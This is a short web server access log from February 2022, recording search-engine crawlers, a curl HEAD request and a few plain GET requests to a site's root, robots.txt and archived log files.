114.119.149.218 - - [14/Feb/2022:15:17:55 -0800] "GET /self.logs/2015/access.log.2015-12-20.gz HTTP/1.1" 200 6551 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
111.172.5.10 - - [14/Feb/2022:15:31:50 -0800] "HEAD / HTTP/1.1" 200 352 "-" "curl/7.29.0" 
114.119.149.23 - - [14/Feb/2022:15:42:51 -0800] "GET /self.logs/access.log.2020-08-23.gz HTTP/1.1" 200 14891 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
89.45.201.6 - - [14/Feb/2022:15:44:19 -0800] "GET / HTTP/1.1" 301 419 "-" "-" 
89.45.201.6 - - [14/Feb/2022:15:44:19 -0800] "GET / HTTP/1.1" 200 49089 "-" "-" 
85.208.98.51 - - [14/Feb/2022:15:47:09 -0800] "GET /robots.txt HTTP/1.1" 301 439 "-" "Mozilla/5.0 (compatible; SemrushBot-BM/1.0; +http://www.semrush.com/bot.html)" 
85.208.98.51 - - [14/Feb/2022:15:47:14 -0800] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; SemrushBot-BM/1.0; +http://www.semrush.com/bot.html)" 
114.119.149.237 - - [14/Feb/2022:15:49:04 -0800] "GET /self.logs/access.log.2020-08-03.gz HTTP/1.1" 200 14169 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
207.46.13.185 - - [14/Feb/2022:15:51:49 -0800] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.149 - - [14/Feb/2022:15:53:59 -0800] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.185 - - [14/Feb/2022:15:54:10 -0800] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.145.137 - - [14/Feb/2022:15:55:17 -0800] "GET /self.logs/error.log.2017-03-02.gz HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.140.174 - - [14/Feb/2022:16:01:23 -0800] "GET /self.logs/2015/error.log.2015-07-08.gz HTTP/1.1" 200 1275 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.136 - - [14/Feb/2022:16:04:34 -0800] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
